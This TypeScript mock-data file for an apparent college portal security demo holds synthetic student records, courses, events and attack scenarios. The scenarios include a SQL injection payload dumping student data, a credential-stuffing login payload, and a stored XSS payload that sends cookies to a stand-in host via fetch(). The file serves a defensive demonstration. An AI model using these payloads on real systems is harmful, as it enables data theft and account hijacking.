export const CAMPUS_ASSETS = {
  backdrop: "/src/assets/images/bmsit_campus_backdrop_1795592252330.jpg",
  utsaha: "/src/assets/images/bmsit_utsaha_event_1795592252022.jpg",
  ideaLab: "/src/assets/images/bmsit_idea_lab_1795592253557.jpg",
  auditorium: "/src/assets/images/bmsit_bsn_auditorium_1795592253308.jpg",
} as const;

export interface PortalUser {
  id: string;
  role: "student" | "faculty";
  usnOrId: string;
  name: string;
  department: string;
  subtitle: string;
  email: string;
  demoPassword: string;
}

export const demoPortalAccounts: PortalUser[] = [
  {
    id: "STU-01",
    role: "student",
    usnOrId: "1BY22CS041",
    name: "Aarav Kulkarni",
    department: "CSE",
    subtitle: "Semester VI · Section A · CGPA 9.24",
    email: "1by22cs041@bmsit.in",
    demoPassword: "bmsit@2026",
  },
  {
    id: "STU-02",
    role: "student",
    usnOrId: "1BY22AI019",
    name: "Ananya Deshmukh",
    department: "AI & ML",
    subtitle: "Semester VI · Section B · CGPA 9.51",
    email: "1by22ai019@bmsit.in",
    demoPassword: "bmsit@2026",
  },
  {
    id: "FAC-01",
    role: "faculty",
    usnOrId: "FAC-CSE-104",
    name: "Dr. Thippeswamy G.",
    department: "CSE · Portal Admin",
    subtitle: "Professor & HOD · Security Oversight",
    email: "hod.cse@bmsit.in",
    demoPassword: "admin@2026",
  },
];

export const campusCirculars = [
  {
    id: "CIR-204",
    date: "25 Nov 2026",
    category: "Examination",
    title: "Autonomous CIE-2 Hall Tickets enabled on Student Portal",
    detail: "Verify attendance eligibility (>= 85%) and download QR-signed hall tickets before 27 Nov.",
  },
  {
    id: "CIR-203",
    date: "24 Nov 2026",
    category: "Academics",
    title: "Even Semester 2026–27 CBCS Open Elective Registration Open",
    detail: "Window open for IV & VI semester students up to 24 credits. First-come seat allocation.",
  },
  {
    id: "CIR-202",
    date: "22 Nov 2026",
    category: "Admissions",
    title: "KCET / COMEDK / Management Lateral Entry Document Verification",
    detail: "Report to Academic Block Ground Floor Admission Cell with original marks cards.",
  },
  {
    id: "CIR-201",
    date: "20 Nov 2026",
    category: "Campus Life",
    title: "Utsaha 2026 & AICTE IDEA Lab 24-Hr Buildathon Registrations Live",
    detail: "BMSIT students can claim complimentary digital campus passes via the Event Calendar.",
  },
];

export const bmsitDepartments = [
  { code: "CSE", name: "Computer Science & Engineering", intake: 240, labs: "Cyber Security, Cloud & Systems Labs" },
  { code: "AI & ML", name: "Artificial Intelligence & Machine Learning", intake: 180, labs: "GPU Compute & Autonomous Agents Wing" },
  { code: "ECE", name: "Electronics & Communication Engg.", intake: 180, labs: "VLSI Design, IoT & Embedded Systems Lab" },
  { code: "CSBS", name: "Computer Science & Business Systems", intake: 60, labs: "TCS-Designed FinTech & Analytics Studio" },
  { code: "EEE", name: "Electrical & Electronics Engineering", intake: 60, labs: "Smart Grid & Power Electronics Lab" },
  { code: "ME", name: "Mechanical Engineering", intake: 60, labs: "AICTE IDEA Lab, CNC & Robotics Bay" },
  { code: "CV", name: "Civil Engineering", intake: 60, labs: "Structural & Sustainable Materials Lab" },
  { code: "MBA / MCA", name: "Postgraduate Management & Applications", intake: 120, labs: "BICEP Incubation & Business Analytics Hub" },
];

export interface LibraryBook {
  id: string;
  isbn: string;
  title: string;
  author: string;
  shelf: string;
  status: "Borrowed" | "Available";
  dueDate?: string;
}

export const initialLibraryBooks: LibraryBook[] = [
  {
    id: "LIB-101",
    isbn: "978-0134093413",
    title: "Computer Security: Principles and Practice",
    author: "William Stallings & Lawrie Brown",
    shelf: "Central Library · Floor 2 · CS-04",
    status: "Borrowed",
    dueDate: "04 Dec 2026",
  },
  {
    id: "LIB-102",
    isbn: "978-1491950357",
    title: "Designing Data-Intensive Applications",
    author: "Martin Kleppmann",
    shelf: "Central Library · Floor 2 · CS-11",
    status: "Borrowed",
    dueDate: "09 Dec 2026",
  },
  {
    id: "LIB-103",
    isbn: "978-0262035613",
    title: "Deep Learning",
    author: "Ian Goodfellow, Yoshua Bengio",
    shelf: "AI Reference Wing · R-08",
    status: "Available",
  },
  {
    id: "LIB-104",
    isbn: "978-1118026472",
    title: "The Web Application Hacker's Handbook",
    author: "Dafydd Stuttard & Marcus Pinto",
    shelf: "Cyber Security Shelf · SEC-02",
    status: "Available",
  },
  {
    id: "LIB-105",
    isbn: "978-0132350884",
    title: "VLSI Design: Circuits and Systems Perspective",
    author: "Neil Weste & David Harris",
    shelf: "Central Library · Floor 1 · EC-09",
    status: "Available",
  },
];

export const periods = ["7 days", "30 days", "90 days"] as const;
export type Period = (typeof periods)[number];

export interface StudentRecord {
  id: string;
  usn: string;
  name: string;
  department: "CSE" | "AI & ML" | "ECE" | "CSBS" | "Mechanical" | "EEE" | "MBA";
  semester: number;
  section: string;
  cgpa: number;
  attendance: number;
  creditsEarned: number;
  mentor: string;
  email: string;
  phone: string;
  hostelStatus: "Day Scholar" | "Boys Hostel Block B" | "Girls Hostel Block A";
  libraryBooks: number;
  feeStatus: "Paid" | "Pending Verification" | "Scholarship Approved";
  standing: "Honors" | "Good Standing" | "Attendance Watch";
  recentScores: { code: string; subject: string; cie: number; grade: string }[];
}

export interface CourseItem {
  code: string;
  title: string;
  department: "CSE" | "AI & ML" | "ECE" | "CSBS" | "Mechanical" | "Open Elective";
  credits: number;
  semester: string;
  faculty: string;
  schedule: string;
  room: string;
  enrolled: number;
  capacity: number;
  category: "Core" | "Professional Elective" | "Open Elective" | "Lab";
  prerequisite: string;
  description: string;
  registered: boolean;
}

export interface CampusEvent {
  id: string;
  title: string;
  category: "Cultural" | "Technical" | "Academic" | "Innovation";
  date: string; // YYYY-MM-DD
  dayOfMonth: number;
  monthLabel: string;
  time: string;
  venue: string;
  organizer: string;
  attendees: number;
  capacity: number;
  rsvped: boolean;
  featured?: boolean;
  image?: string;
  summary: string;
}

export interface PortalActivityLog {
  id: string;
  event: string;
  portal: string;
  actor: string;
  status: "Verified" | "Blocked" | "Needs review" | "Scheduled" | "Compromised";
  time: string;
}

export type AttackId = "sqli" | "bruteforce" | "xss" | "ddos" | "idor";

export interface AttackScenario {
  id: AttackId;
  name: string;
  shortLabel: string;
  category: string;
  severity: "Critical" | "High";
  targetPortal: string;
  endpoint: string;
  attackerIp: string;
  payload: string;
  description: string;
  withoutAgent: {
    outcomeHeadline: string;
    portalStatus: string;
    recordsExposed: number;
    downtimeLabel: string;
    integrityScore: number;
    impactSummary: string;
    leakedPreview: string[];
  };
  withAgent: {
    outcomeHeadline: string;
    portalStatus: string;
    recordsExposed: number;
    responseMs: number;
    integrityScore: number;
    mitigationAction: string;
    agentSteps: { phase: string; detail: string; ms: string }[];
  };
}

export const portalAnalytics: Record<
  Period,
  {
    activeStudents: number;
    portalRequests: number;
    blockedThreats: number;
    avgAttendance: number;
    courseEnrollments: number;
    libraryCheckouts: number;
    studentDelta: string;
    requestDelta: string;
    threatDelta: string;
    attendanceDelta: string;
    axis: string[];
    legitimateTraffic: number[]; // in thousands
    blockedTraffic: number[]; // in hundreds scaled for visual comparison
    portalBreakdown: number[]; // [Academics/Results, Registration, Profiles/Attendance]
    deptDistribution: { label: string; pct: number }[];
  }
> = {
  "7 days": {
    activeStudents: 4820,
    portalRequests: 84200,
    blockedThreats: 312,
    avgAttendance: 86.4,
    courseEnrollments: 1492,
    libraryCheckouts: 628,
    studentDelta: "+3.2%",
    requestDelta: "+11.4%",
    threatDelta: "+18.6%",
    attendanceDelta: "+1.4%",
    axis: ["Wed", "Thu", "Fri", "Sat", "Sun", "Mon", "Tue"],
    legitimateTraffic: [11.2, 12.8, 13.4, 9.1, 7.6, 14.9, 15.2],
    blockedTraffic: [1.8, 2.4, 3.1, 1.5, 1.9, 4.2, 3.8],
    portalBreakdown: [48, 34, 18],
    deptDistribution: [
      { label: "CSE & AI/ML", pct: 46 },
      { label: "ECE & EEE", pct: 31 },
      { label: "Core & PG", pct: 23 },
    ],
  },
  "30 days": {
    activeStudents: 5140,
    portalRequests: 342800,
    blockedThreats: 1284,
    avgAttendance: 87.2,
    courseEnrollments: 4910,
    libraryCheckouts: 2415,
    studentDelta: "+5.8%",
    requestDelta: "+14.2%",
    threatDelta: "+22.1%",
    attendanceDelta: "+2.1%",
    axis: ["Oct 26", "Oct 31", "Nov 5", "Nov 10", "Nov 15", "Nov 20", "Nov 25"],
    legitimateTraffic: [42.5, 48.2, 45.8, 54.0, 51.2, 49.4, 51.7],
    blockedTraffic: [7.4, 9.1, 11.2, 14.8, 12.1, 10.6, 15.4],
    portalBreakdown: [52, 31, 17],
    deptDistribution: [
      { label: "CSE & AI/ML", pct: 48 },
      { label: "ECE & EEE", pct: 30 },
      { label: "Core & PG", pct: 22 },
    ],
  },
  "90 days": {
    activeStudents: 5285,
    portalRequests: 986400,
    blockedThreats: 3640,
    avgAttendance: 86.9,
    courseEnrollments: 5285,
    libraryCheckouts: 7190,
    studentDelta: "+8.1%",
    requestDelta: "+19.5%",
    threatDelta: "+27.4%",
    attendanceDelta: "+1.8%",
    axis: ["Aug 28", "Sep 12", "Sep 27", "Oct 12", "Oct 27", "Nov 11", "Nov 25"],
    legitimateTraffic: [118, 134, 142, 156, 139, 148, 149.4],
    blockedTraffic: [21, 26, 33, 41, 38, 44, 49],
    portalBreakdown: [54, 29, 17],
    deptDistribution: [
      { label: "CSE & AI/ML", pct: 49 },
      { label: "ECE & EEE", pct: 29 },
      { label: "Core & PG", pct: 22 },
    ],
  },
};

export const dailyShieldActivity = [
  { label: "Wed", verified: 142, intercepted: 18 },
  { label: "Thu", verified: 178, intercepted: 24 },
  { label: "Fri", verified: 196, intercepted: 31 },
  { label: "Sat", verified: 124, intercepted: 15 },
  { label: "Sun", verified: 112, intercepted: 19 },
  { label: "Mon", verified: 234, intercepted: 42 },
  { label: "Tue", verified: 248, intercepted: 38 },
];

export const initialStudents: StudentRecord[] = [
  {
    id: "STU-01",
    usn: "1BY22CS041",
    name: "Aarav Kulkarni",
    department: "CSE",
    semester: 6,
    section: "A",
    cgpa: 9.24,
    attendance: 92.5,
    creditsEarned: 118,
    mentor: "Dr. Sunitha N. R.",
    email: "1by22cs041@bmsit.in",
    phone: "+91 98450 22104",
    hostelStatus: "Day Scholar",
    libraryBooks: 2,
    feeStatus: "Paid",
    standing: "Honors",
    recentScores: [
      { code: "22CS51", subject: "Operating Systems", cie: 47, grade: "O" },
      { code: "22CS52", subject: "Database Management Systems", cie: 46, grade: "A+" },
      { code: "22CS53", subject: "Computer Networks", cie: 44, grade: "A+" },
    ],
  },
  {
    id: "STU-02",
    usn: "1BY22AI019",
    name: "Ananya Deshmukh",
    department: "AI & ML",
    semester: 6,
    section: "B",
    cgpa: 9.51,
    attendance: 95.0,
    creditsEarned: 120,
    mentor: "Dr. Anupama H. S.",
    email: "1by22ai019@bmsit.in",
    phone: "+91 98801 44912",
    hostelStatus: "Girls Hostel Block A",
    libraryBooks: 3,
    feeStatus: "Scholarship Approved",
    standing: "Honors",
    recentScores: [
      { code: "22AI51", subject: "Machine Learning Foundations", cie: 49, grade: "O" },
      { code: "22AI52", subject: "Natural Language Processing", cie: 48, grade: "O" },
      { code: "22AI53", subject: "Big Data Analytics", cie: 45, grade: "A+" },
    ],
  },
  {
    id: "STU-03",
    usn: "1BY22EC073",
    name: "Rohan Hegde",
    department: "ECE",
    semester: 6,
    section: "A",
    cgpa: 8.42,
    attendance: 84.0,
    creditsEarned: 114,
    mentor: "Prof. Raghavendra Rao",
    email: "1by22ec073@bmsit.in",
    phone: "+91 97392 81540",
    hostelStatus: "Boys Hostel Block B",
    libraryBooks: 1,
    feeStatus: "Paid",
    standing: "Good Standing",
    recentScores: [
      { code: "22EC51", subject: "Digital Signal Processing", cie: 41, grade: "A" },
      { code: "22EC52", subject: "Microcontrollers & IoT", cie: 44, grade: "A+" },
      { code: "22EC53", subject: "RF & Microwave Engineering", cie: 39, grade: "A" },
    ],
  },
  {
    id: "STU-04",
    usn: "1BY23CB027",
    name: "Meghana Shetty",
    department: "CSBS",
    semester: 4,
    section: "A",
    cgpa: 8.88,
    attendance: 89.2,
    creditsEarned: 76,
    mentor: "Dr. Bharathi M.",
    email: "1by23cb027@bmsit.in",
    phone: "+91 99012 63478",
    hostelStatus: "Day Scholar",
    libraryBooks: 2,
    feeStatus: "Paid",
    standing: "Good Standing",
    recentScores: [
      { code: "22CB41", subject: "Design & Analysis of Algorithms", cie: 45, grade: "A+" },
      { code: "22CB42", subject: "Financial Management", cie: 43, grade: "A+" },
      { code: "22CB43", subject: "Software Engineering", cie: 44, grade: "A+" },
    ],
  },
  {
    id: "STU-05",
    usn: "1BY23ME014",
    name: "Karthik Nair",
    department: "Mechanical",
    semester: 4,
    section: "B",
    cgpa: 7.76,
    attendance: 73.5,
    creditsEarned: 72,
    mentor: "Dr. Prasad B. S.",
    email: "1by23me014@bmsit.in",
    phone: "+91 96114 50923",
    hostelStatus: "Boys Hostel Block B",
    libraryBooks: 4,
    feeStatus: "Pending Verification",
    standing: "Attendance Watch",
    recentScores: [
      { code: "22ME41", subject: "Applied Thermodynamics", cie: 36, grade: "B+" },
      { code: "22ME42", subject: "CAD / CAM Lab", cie: 42, grade: "A" },
      { code: "22ME43", subject: "Fluid Mechanics", cie: 35, grade: "B+" },
    ],
  },
  {
    id: "STU-06",
    usn: "1BY22CS112",
    name: "Diya Venkatraman",
    department: "CSE",
    semester: 6,
    section: "C",
    cgpa: 9.08,
    attendance: 91.0,
    creditsEarned: 118,
    mentor: "Dr. Thippeswamy G.",
    email: "1by22cs112@bmsit.in",
    phone: "+91 98441 77290",
    hostelStatus: "Girls Hostel Block A",
    libraryBooks: 1,
    feeStatus: "Paid",
    standing: "Honors",
    recentScores: [
      { code: "22CS51", subject: "Operating Systems", cie: 46, grade: "A+" },
      { code: "22CS54", subject: "Cyber Security Essentials", cie: 49, grade: "O" },
      { code: "22CS55", subject: "Web Technologies Lab", cie: 47, grade: "O" },
    ],
  },
  {
    id: "STU-07",
    usn: "1BY22EE039",
    name: "Siddharth Gowda",
    department: "EEE",
    semester: 6,
    section: "A",
    cgpa: 8.15,
    attendance: 82.4,
    creditsEarned: 112,
    mentor: "Dr. Babu Naik G.",
    email: "1by22ee039@bmsit.in",
    phone: "+91 99805 31867",
    hostelStatus: "Day Scholar",
    libraryBooks: 2,
    feeStatus: "Paid",
    standing: "Good Standing",
    recentScores: [
      { code: "22EE51", subject: "Power Electronics", cie: 40, grade: "A" },
      { code: "22EE52", subject: "Control Systems", cie: 42, grade: "A" },
      { code: "22EE53", subject: "Smart Grid Architecture", cie: 41, grade: "A" },
    ],
  },
  {
    id: "STU-08",
    usn: "1BY24MB018",
    name: "Niharika Rao",
    department: "MBA",
    semester: 2,
    section: "A",
    cgpa: 8.95,
    attendance: 93.8,
    creditsEarned: 44,
    mentor: "Dr. Kavitha S.",
    email: "1by24mb018@bmsit.in",
    phone: "+91 97408 19245",
    hostelStatus: "Day Scholar",
    libraryBooks: 3,
    feeStatus: "Scholarship Approved",
    standing: "Honors",
    recentScores: [
      { code: "22MB21", subject: "Business Analytics", cie: 47, grade: "O" },
      { code: "22MB22", subject: "Corporate Strategy", cie: 45, grade: "A+" },
      { code: "22MB23", subject: "Operations & Supply Chain", cie: 44, grade: "A+" },
    ],
  },
];

export const initialCourses: CourseItem[] = [
  {
    code: "22CS61",
    title: "Distributed Systems & Cloud Security",
    department: "CSE",
    credits: 4,
    semester: "Sem VI · Autonomous",
    faculty: "Dr. Thippeswamy G.",
    schedule: "Mon · Wed · Fri 09:00",
    room: "Academic Block · CR-304",
    enrolled: 56,
    capacity: 60,
    category: "Core",
    prerequisite: "22CS53 Computer Networks",
    description: "Consensus protocols, zero-trust microservice architecture, Kubernetes hardening, and fault-tolerant campus cloud deployments.",
    registered: true,
  },
  {
    code: "22AI62",
    title: "Deep Learning & Autonomous Agents",
    department: "AI & ML",
    credits: 4,
    semester: "Sem VI · Autonomous",
    faculty: "Dr. Anupama H. S.",
    schedule: "Tue · Thu 10:30 · Fri 14:00",
    room: "AI Research Wing · L-202",
    enrolled: 54,
    capacity: 60,
    category: "Core",
    prerequisite: "22AI51 Machine Learning",
    description: "Transformer architectures, tool-augmented defense agents, anomaly detection pipelines, and real-time inference optimization.",
    registered: true,
  },
  {
    code: "22CS63",
    title: "Web Security & OWASP Defense Lab",
    department: "CSE",
    credits: 3,
    semester: "Sem VI · Autonomous",
    faculty: "Prof. Naveen Kumar K.",
    schedule: "Mon · Thu 14:00",
    room: "Lab Block · Cyber Lab 2",
    enrolled: 48,
    capacity: 50,
    category: "Lab",
    prerequisite: "22CS55 Web Technologies",
    description: "Hands-on prevention of SQLi, XSS, CSRF, IDOR, and automated credential attacks using runtime AI telemetry and WAF policies.",
    registered: true,
  },
  {
    code: "22EC64",
    title: "VLSI System Design & Verification",
    department: "ECE",
    credits: 4,
    semester: "Sem VI · Autonomous",
    faculty: "Prof. Raghavendra Rao",
    schedule: "Tue · Thu 09:00",
    room: "ECE Block · V-108",
    enrolled: 44,
    capacity: 60,
    category: "Core",
    prerequisite: "22EC42 Digital System Design",
    description: "CMOS circuit synthesis, static timing analysis, SystemVerilog verification, and low-power SoC layout practices.",
    registered: false,
  },
  {
    code: "22CB65",
    title: "Enterprise Analytics & FinTech Systems",
    department: "CSBS",
    credits: 3,
    semester: "Sem VI · Autonomous",
    faculty: "Dr. Bharathi M.",
    schedule: "Wed · Fri 11:30",
    room: "Academic Block · CR-211",
    enrolled: 39,
    capacity: 55,
    category: "Professional Elective",
    prerequisite: "22CB42 Financial Management",
    description: "Algorithmic risk modeling, payment ledger compliance, and real-time operational analytics for technology enterprises.",
    registered: false,
  },
  {
    code: "22ME62",
    title: "Robotics Prototyping at AICTE IDEA Lab",
    department: "Mechanical",
    credits: 3,
    semester: "Sem VI · Autonomous",
    faculty: "Dr. Prasad B. S.",
    schedule: "Tue · Fri 14:30",
    room: "AICTE IDEA Lab · Bay 1",
    enrolled: 27,
    capacity: 30,
    category: "Lab",
    prerequisite: "Open to All Branches",
    description: "Interdisciplinary CNC fabrication, PCB assembly, ROS2 navigation, and rapid hardware prototyping in the BMSIT IDEA Lab.",
    registered: false,
  },
  {
    code: "22OE61",
    title: "Ethical Hacking & Digital Forensics",
    department: "Open Elective",
    credits: 3,
    semester: "Sem VI · Open Elective",
    faculty: "Dr. Sunitha N. R.",
    schedule: "Wed 14:00 · Sat 09:30",
    room: "Academic Block · SH-102",
    enrolled: 58,
    capacity: 65,
    category: "Open Elective",
    prerequisite: "None",
    description: "Threat modeling, packet forensics, SIEM log triage, and incident response drills modeled on university infrastructure.",
    registered: true,
  },
  {
    code: "22OE64",
    title: "Venture Creation & BICEP Incubation",
    department: "Open Elective",
    credits: 2,
    semester: "Sem VI · Open Elective",
    faculty: "Dr. Kavitha S.",
    schedule: "Thu 15:30",
    room: "BICEP Innovation Park",
    enrolled: 34,
    capacity: 45,
    category: "Open Elective",
    prerequisite: "None",
    description: "Product discovery, IP filing, and pitch preparation mentored by founders at BMS Innovation Centre & Entrepreneurship Park.",
    registered: false,
  },
];

export const initialEvents: CampusEvent[] = [
  {
    id: "EVT-01",
    title: "Utsaha 2026 — Annual Techno-Cultural Fest",
    category: "Cultural",
    date: "2026-11-28",
    dayOfMonth: 28,
    monthLabel: "Nov 2026",
    time: "16:30 – 21:30",
    venue: "BMSIT Main Lawn & Amphitheater",
    organizer: "Student Cultural & Tech Council",
    attendees: 1140,
    capacity: 1500,
    rsvped: true,
    featured: true,
    image: CAMPUS_ASSETS.utsaha,
    summary: "Flagship inter-collegiate festival combining live student music ensembles, robotics demos, and culinary stalls across the Yelahanka campus.",
  },
  {
    id: "EVT-02",
    title: "AICTE IDEA Lab 24-Hour Hardware & AI Sprint",
    category: "Innovation",
    date: "2026-11-26",
    dayOfMonth: 26,
    monthLabel: "Nov 2026",
    time: "09:00 – 09:00 (+1d)",
    venue: "AICTE IDEA Lab · Ground Floor",
    organizer: "BICEP & IEEE BMSIT Chapter",
    attendees: 148,
    capacity: 160,
    rsvped: true,
    featured: true,
    image: CAMPUS_ASSETS.ideaLab,
    summary: "Cross-departmental buildathon prototyping campus sustainability sensors, autonomous rovers, and secure edge controllers.",
  },
  {
    id: "EVT-03",
    title: "TEDxBMSITM: Resilient Digital Futures",
    category: "Technical",
    date: "2026-12-04",
    dayOfMonth: 4,
    monthLabel: "Dec 2026",
    time: "10:00 – 16:00",
    venue: "BSN Auditorium",
    organizer: "TEDxBMSITM Curatorial Team",
    attendees: 412,
    capacity: 450,
    rsvped: false,
    featured: true,
    image: CAMPUS_ASSETS.auditorium,
    summary: "Eight curated talks from Bengaluru AI architects, cybersecurity researchers, and BMSIT alumni exploring trustworthy systems.",
  },
  {
    id: "EVT-04",
    title: "Autonomous CIE-2 & Lab Internal Assessment Window",
    category: "Academic",
    date: "2026-11-25",
    dayOfMonth: 25,
    monthLabel: "Nov 2026",
    time: "09:30 – 13:00",
    venue: "Academic Block Examination Halls",
    organizer: "Office of Controller of Examinations",
    attendees: 3820,
    capacity: 4000,
    rsvped: false,
    summary: "Continuous Internal Evaluation cycle for III, V, and VII semester UG programs. Admit cards verifiable via Student Portal.",
  },
  {
    id: "EVT-05",
    title: "Mission Portal Shield — Live Cyber Defense Drill",
    category: "Technical",
    date: "2026-11-27",
    dayOfMonth: 27,
    monthLabel: "Nov 2026",
    time: "14:00 – 17:30",
    venue: "Cyber Security Lab · Block B",
    organizer: "Dept. of CSE & Cyber Club",
    attendees: 92,
    capacity: 120,
    rsvped: true,
    summary: "Red-team vs AI-blue-team exercise demonstrating automated detection and mitigation of SQLi, XSS, and credential stuffing on campus portals.",
  },
  {
    id: "EVT-06",
    title: "BICEP Startup Demo Day & Seed Grant Pitches",
    category: "Innovation",
    date: "2026-11-30",
    dayOfMonth: 30,
    monthLabel: "Nov 2026",
    time: "11:00 – 15:30",
    venue: "BICEP Seminar Hall",
    organizer: "BMS Innovation Centre (BICEP)",
    attendees: 185,
    capacity: 220,
    rsvped: false,
    summary: "Twelve student-founded teams present working prototypes to Bengaluru angel investors and Karnataka Startup Cell mentors.",
  },
];

export const initialPortalActivity: PortalActivityLog[] = [
  { id: "LOG-409", event: "CBCS Course Registration synced (22CS61)", portal: "Course Portal", actor: "1BY22CS041", status: "Verified", time: "12:48" },
  { id: "LOG-408", event: "SQLi payload quarantined on USN lookup", portal: "Student Profiles", actor: "185.220.101.44", status: "Blocked", time: "12:34" },
  { id: "LOG-407", event: "CIE-2 Hall Ticket batch published", portal: "Exam & Results", actor: "COE Admin", status: "Verified", time: "12:15" },
  { id: "LOG-406", event: "High-velocity login burst throttled", portal: "Library & Auth", actor: "45.142.212.19", status: "Blocked", time: "11:52" },
  { id: "LOG-405", event: "Utsaha 2026 RSVP pass issued", portal: "Event Calendar", actor: "1BY22AI019", status: "Verified", time: "11:28" },
  { id: "LOG-404", event: "Scholarship fee verification queued", portal: "Admissions", actor: "1BY23ME014", status: "Needs review", time: "10:56" },
];

export const attackScenarios: AttackScenario[] = [
  {
    id: "sqli",
    name: "SQL Injection on Student Directory",
    shortLabel: "SQL Injection",
    category: "Injection · OWASP A03",
    severity: "Critical",
    targetPortal: "Student Profiles & Results Portal",
    endpoint: "GET /api/portal/students?usn=1BY22CS041' OR '1'='1' UNION SELECT usn,email,phone,cgpa FROM students--",
    attackerIp: "185.220.101.44",
    payload: "1BY22CS041' OR '1'='1' UNION SELECT usn, name, email, phone, cgpa FROM bmsit_students --",
    description: "Attacker crafts a tautology SQL payload inside the USN search parameter to bypass authentication and dump the entire student PII and exam results database.",
    withoutAgent: {
      outcomeHeadline: "Full Student PII Table Exfiltrated",
      portalStatus: "Data Breach · 200 OK (Unfiltered Dump)",
      recordsExposed: 5140,
      downtimeLabel: "Exposed for 42 min",
      integrityScore: 24,
      impactSummary: "Unparameterized query executed verbatim. All 5,140 synthetic student records—including USNs, personal phone numbers, hostel blocks, and CIE marks—were streamed to the attacker in JSON.",
      leakedPreview: [
        "1BY22CS041 | Aarav Kulkarni | +91 98450 22104 | CGPA 9.24 | Day Scholar",
        "1BY22AI019 | Ananya Deshmukh | +91 98801 44912 | CGPA 9.51 | Girls Hostel A",
        "1BY22EC073 | Rohan Hegde | +91 97392 81540 | CGPA 8.42 | Boys Hostel B",
        "... +5,137 more student & faculty rows dumped (4.8 MB exfiltrated)",
      ],
    },
    withAgent: {
      outcomeHeadline: "SQLi Payload Neutralized Before DB Layer",
      portalStatus: "Protected · 403 Quarantined (Portal 100% Online)",
      recordsExposed: 0,
      responseMs: 22,
      integrityScore: 100,
      mitigationAction: "Semantic AST SQLi parser flagged UNION/OR tautology, blocked IP 185.220.101.44, and enforced strict USN regex `^1BY\\d{2}[A-Z]{2}\\d{3}$`.",
      agentSteps: [
        { phase: "01. Telemetry Intercept", detail: "Captured anomalous query string on /api/portal/students containing SQL boolean tautology + UNION SELECT.", ms: "4 ms" },
        { phase: "02. AI Threat Classification", detail: "Classified as OWASP A03 SQL Injection (99.6% confidence). Risk level: CRITICAL — Student PII exposure.", ms: "11 ms" },
        { phase: "03. Autonomous Defense", detail: "Dropped request at edge WAF, quarantined source IP 185.220.101.44 for 24h, and locked USN validator to strict schema.", ms: "18 ms" },
        { phase: "04. Integrity Verification", detail: "Verified zero rows returned to attacker. Legitimate student lookups continue uninterrupted at 14ms latency.", ms: "22 ms" },
      ],
    },
  },
  {
    id: "bruteforce",
    name: "Credential Stuffing on Exam & Library Login",
    shortLabel: "Credential Stuffing",
    category: "Broken Auth · OWASP A07",
    severity: "High",
    targetPortal: "Results & Central Library Auth",
    endpoint: "POST /portal/auth/login (420 attempts/sec from rotating botnet)",
    attackerIp: "45.142.212.19",
    payload: "{\"usn\": \"1BY22CS041\", \"password\": \"bmsit@2024\", \"batch\": 4200}",
    description: "Automated script tests 4,200 leaked username/password combinations against BMSIT student and faculty portal logins to hijack accounts and alter registrations.",
    withoutAgent: {
      outcomeHeadline: "38 Student & 2 Staff Accounts Hijacked",
      portalStatus: "Auth Compromised · Account Takeover",
      recordsExposed: 40,
      downtimeLabel: "Auth queue stalled 19 min",
      integrityScore: 41,
      impactSummary: "No velocity throttling or behavioral bot detection active. Attacker compromised 40 portal accounts, dropped enrolled electives, and accessed private exam transcripts.",
      leakedPreview: [
        "HIJACKED: 1BY23ME014 (Session token issued -> 45.142.212.19)",
        "HIJACKED: 1BY22EE039 (Course 22EE51 dropped by attacker)",
        "HIJACKED: staff.library04@bmsit.in (Admin fine ledger accessed)",
        "... 37 additional student sessions compromised before manual lock",
      ],
    },
    withAgent: {
      outcomeHeadline: "Botnet Throttled & Zero Accounts Compromised",
      portalStatus: "Protected · Adaptive Rate Limit Active",
      recordsExposed: 0,
      responseMs: 31,
      integrityScore: 100,
      mitigationAction: "Behavioral velocity engine detected non-human login cadence, applied progressive tarpit, invalidated bot fingerprints, and enforced step-up OTP.",
      agentSteps: [
        { phase: "01. Anomaly Detection", detail: "Detected 420 login POSTs/sec across 86 distinct USNs sharing identical TLS/JA3 fingerprint.", ms: "7 ms" },
        { phase: "02. AI Risk Scoring", detail: "Classified as Distributed Credential Stuffing (98.9% confidence). Automated headless client signature confirmed.", ms: "16 ms" },
        { phase: "03. Autonomous Containment", detail: "Engaged dynamic IP/ASN tarpit on /portal/auth/login and issued cryptographic challenge for flagged subnet.", ms: "25 ms" },
        { phase: "04. Account Hygiene", detail: "Notified targeted USN holders to rotate weak passwords. Zero unauthorized sessions granted.", ms: "31 ms" },
      ],
    },
  },
  {
    id: "xss",
    name: "Stored XSS in Event RSVP & Course Feedback",
    shortLabel: "Stored XSS",
    category: "Client-Side Injection · OWASP A03",
    severity: "High",
    targetPortal: "Campus Event Calendar & Course Portal",
    endpoint: "POST /api/events/EVT-01/rsvp { note: '<img src=x onerror=...>' }",
    attackerIp: "103.88.241.12",
    payload: "<img src=x onerror=\"fetch('https://collect.bad/s?t='+btoa(document.cookie))\">",
    description: "Malicious JavaScript payload submitted inside an Utsaha 2026 event registration comment executes in the browser of every faculty coordinator and student viewing the roster.",
    withoutAgent: {
      outcomeHeadline: "Session Cookies Stolen from 214 Viewers",
      portalStatus: "DOM Hijacked · Active Script Execution",
      recordsExposed: 214,
      downtimeLabel: "Persistent until manual DB wipe",
      integrityScore: 36,
      impactSummary: "Unsanitized HTML rendered directly into the event attendee table. Faculty admin session tokens were silently beaconed to an external collector domain.",
      leakedPreview: [
        "DOM_EXEC: Faculty coordinator session cookie exfiltrated (uid=COE_ADMIN)",
        "DOM_EXEC: 213 student RSVP viewers redirected to phishing fee portal",
        "EXTERNAL BEACON: POST https://collect.bad/s -> 200 OK",
      ],
    },
    withAgent: {
      outcomeHeadline: "Script Payload Stripped & CSP Enforced",
      portalStatus: "Protected · Sanitized & Blocked",
      recordsExposed: 0,
      responseMs: 18,
      integrityScore: 100,
      mitigationAction: "Context-aware DOM sanitizer stripped executable event handlers, rejected payload with 422, and tightened Content-Security-Policy header.",
      agentSteps: [
        { phase: "01. Payload Inspection", detail: "Detected inline HTML `onerror` handler and external `fetch()` exfiltration pattern in RSVP note field.", ms: "3 ms" },
        { phase: "02. Semantic Verification", detail: "Confirmed Stored XSS vector targeting session cookies (99.4% confidence).", ms: "9 ms" },
        { phase: "03. Active Neutralization", detail: "Blocked write to event database, sanitized input pipeline, and pushed strict `script-src 'self'` CSP nonce policy.", ms: "14 ms" },
        { phase: "04. Portal Verification", detail: "Event Calendar & Utsaha RSVP list verified 100% clean across all active student browsers.", ms: "18 ms" },
      ],
    },
  },
  {
    id: "ddos",
    name: "Registration Window DDoS Flood",
    shortLabel: "DDoS Flood",
    category: "Availability · Volumetric L7",
    severity: "Critical",
    targetPortal: "CBCS Course Registration Portal",
    endpoint: "POST /api/courses/register (18,500 concurrent flood requests)",
    attackerIp: "91.240.118.0/24",
